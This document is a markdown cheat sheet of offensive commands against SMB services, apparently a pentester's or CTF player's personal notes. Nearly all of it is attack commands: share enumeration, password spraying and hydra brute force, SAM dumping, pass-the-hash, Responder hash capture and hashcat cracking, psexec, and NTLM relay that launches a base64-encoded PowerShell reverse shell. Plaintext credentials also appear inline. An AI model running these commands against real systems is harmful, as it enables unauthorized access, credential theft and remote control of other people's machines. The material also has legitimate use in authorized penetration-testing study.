---
title: smb
---

# smb

- mount vhd via smb share
    - `mkdir smbmount`
    - `mount -t cifs //$ip/david -o user=david smbmount`



- enumerate `sudo nmap $ip -sV -sC -p139,445`
- smbmap
    - `smbmap -H $ip`
    - `smbmap -u david -p gRzX7YbeTcDG7 -H $ip`
    - recursive list all files `smbmap -H $ip -u anonymous -R`
- smbclient
    - null session (no username/password) `smbclient -N -L //$ip`
    - list `smbclient -L //$ip/$sharename`
        - no authentication `smbclient -N -L //$ip/$sharename`
    - authenticated (try blank password)
        - `smbclient -U administrator //$ip/ADMIN$`
        - `smbclient -U david //$ip/david`           
    - connection username%password `smbclient //$ip/GGJ -U "jason%34c8zuNBo91\!@28Bszh"`
    - download `smbmap -H $ip --download "notes\note.txt"`
    - upload `smbmap -H $ip --upload test.txt "notes\test.txt"`
- enum4linux
    - `enum4linux $ip -A -C`
- crackmapexec
    - `crackmapexec smb $ip -u "user" -p "password" --shares`
    - password spray `crackmapexec smb $ip -u /tmp/userlist.txt -p 'Company01!' --local-auth --continue-on-success`
    - execute command `crackmapexec smb $ip -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
    - network scan logged on users `crackmapexec smb $ip/24 -u administrator -p 'Password123!' --loggedon-users`
    - get sam `crackmapexec smb $ip -u administrator -p 'Password123!' --sam`
    - pass the hash `crackmapexec smb $ip -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`
- responder
    - `sudo responder -I tun0`
        - `Responder IP               [10.10.14.198]`
        - wait for events
        - crack `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
        - or `sudo impacket-smbserver share ./ -smb2support`
    - victim 
        - modify hosts file for friendly name `C:\Windows\System32\Drivers\etc\hosts`
            - `mysharefoder     10.10.14.198`
            - `\\mysharefoder\stuff`    
    - if unable to crack password 
        - impacket-ntlmrelayx
            - set `"SMB = OFF"` in `/etc/responder/Responder.conf`
            - `impacket-ntlmrelayx --no-http-server -smb2support -t $ip`
            - create powershell reverse shell from revshells.com and base64 encode
            - `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e $revshellb64encoded'`
- [rpcclient](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
    - `rpcclient -U'%' 10.10.110.17`
    - list users once connected `enumdomusers`
- impacket-psexec
    - `impacket-psexec administrator:'Password123!'@$ip`

- execute commands by prefixing with ! `!cat file.txt`
- brute force 
    - `hydra -L user.list -P password.list smb://$ip`
    - metasploit SMBv3 `use auxiliary/scanner/smb/smb_login`
    - `crackmapexec smb $ip -u jason -p pws.list --local-auth --continue-on-success`
- 